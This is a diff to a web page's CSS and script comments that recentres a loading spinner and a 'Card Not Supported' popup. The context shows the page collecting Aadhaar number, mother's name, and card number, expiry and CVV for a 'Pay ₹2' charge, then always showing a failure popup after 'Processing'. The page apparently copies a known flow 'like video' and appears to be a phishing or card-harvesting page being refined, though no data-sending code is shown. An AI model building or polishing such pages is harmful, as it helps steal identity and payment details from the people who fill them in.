@@ -299,16 +299,19 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    /* ==================== FULL-PAGE LOADING OVERLAY (SPINNER IN TOP AREA LIKE VIDEO) ==================== */
+    /* ==================== VIEWPORT-CENTERED LOADING SPINNER (FOLLOWS CURRENT SCROLL) ==================== */
     .loader-overlay {
       position: fixed;
-      inset: 0;
-      background: #ffffff;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      height: 100dvh;
+      background: rgba(255, 255, 255, 0.96);
       display: none;
+      align-items: center;
       justify-content: center;
-      align-items: flex-start;
-      padding-top: 24vh;
-      z-index: 50;
+      z-index: 9998;
     }
 
     .loader-overlay.active {
@@ -316,22 +319,18 @@
     }
 
     .spinner {
-      width: 48px;
-      height: 48px;
+      width: 50px;
+      height: 50px;
       border: 3.5px solid rgba(0, 114, 188, 0.16);
       border-top-color: var(--primary);
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
 
-    /* Large Ring Spinner After Selecting RuPay / Visa (Positioned at Top Area) */
-    .loader-overlay.big-ring {
-      padding-top: 20vh;
-    }
-
+    /* Large Ring Spinner After Selecting RuPay / Visa (Centered in Current Viewport) */
     .loader-overlay.big-ring .spinner {
-      width: 165px;
-      height: 165px;
+      width: 160px;
+      height: 160px;
       border: 11px solid rgba(0, 114, 188, 0.16);
       border-top-color: var(--primary);
       border-right-color: var(--primary);
@@ -648,16 +647,20 @@
       margin-top: auto;
     }
 
-    /* ==================== CARD NOT SUPPORTED POPUP MODAL (TOP-CENTERED OVER FORM LIKE VIDEO) ==================== */
+    /* ==================== VIEWPORT-CENTERED CARD NOT SUPPORTED POPUP ==================== */
     .modal-backdrop {
       position: fixed;
-      inset: 0;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      height: 100dvh;
       background: rgba(15, 23, 42, 0.45);
       display: none;
+      align-items: center;
       justify-content: center;
-      align-items: flex-start;
-      padding: 18vh 20px 20px;
-      z-index: 60;
+      padding: 20px;
+      z-index: 9999;
     }
 
     .modal-backdrop.active {
@@ -1036,12 +1039,12 @@
     </div>
   </div>
 
-  <!-- TOP-AREA LOADING SPINNER OVERLAY (MATCHES VIDEO) -->
+  <!-- VIEWPORT-CENTERED LOADING SPINNER OVERLAY (FOLLOWS CURRENT SCROLL) -->
   <div id="loader" class="loader-overlay">
     <div class="spinner"></div>
   </div>
 
-  <!-- CARD NOT SUPPORTED POPUP MODAL (MATCHES VIDEO) -->
+  <!-- VIEWPORT-CENTERED CARD NOT SUPPORTED POPUP (FOLLOWS CURRENT SCROLL) -->
   <div id="card-error-modal" class="modal-backdrop">
     <div class="error-modal">
       <div class="error-icon-circle">
@@ -1093,7 +1096,7 @@
       }
     });
 
-    // ==================== TOP-AREA LOADING TRANSITION ====================
+    // ==================== VIEWPORT-CENTERED LOADING TRANSITION ====================
     const loader = document.getElementById("loader");
 
     function transitionTo(nextScreenId, delay = 1000, useBigRing = false) {
@@ -1224,7 +1227,7 @@
     aadhaarInput.addEventListener("blur", validateAadhaar);
     motherNameInput.addEventListener("blur", validateMotherName);
 
-    // ==================== FORM 1 SUBMIT ("Submitting" -> Top-Area Spinner) ====================
+    // ==================== FORM 1 SUBMIT ("Submitting" -> Viewport-Centered Spinner) ====================
     document.getElementById("form-1").addEventListener("submit", (e) => {
       e.preventDefault();
       const v1 = validateFullName();
@@ -1249,7 +1252,7 @@
       }, 600);
     });
 
-    // Page 2 -> Top-Area Large Ring Loading Animation -> Page 3
+    // Page 2 -> Viewport-Centered Large Ring Loading Animation -> Page 3
     function selectNetwork() {
       transitionTo("screen-3", 1250, true);
     }
@@ -1306,7 +1309,7 @@
     cardExpiryInput.addEventListener("blur", validateCardExpiry);
     cardCvvInput.addEventListener("blur", validateCardCvv);
 
-    // ==================== FORM 3 SUBMIT ("Pay ₹2" -> "Processing" -> "Card Not Supported" Popup) ====================
+    // ==================== FORM 3 SUBMIT ("Pay ₹2" -> "Processing" -> Viewport-Centered Popup) ====================
     const form3 = document.getElementById("form-3");
     const btnSubmit3 = document.getElementById("btn-submit-3");
     const errorModal = document.getElementById("card-error-modal");
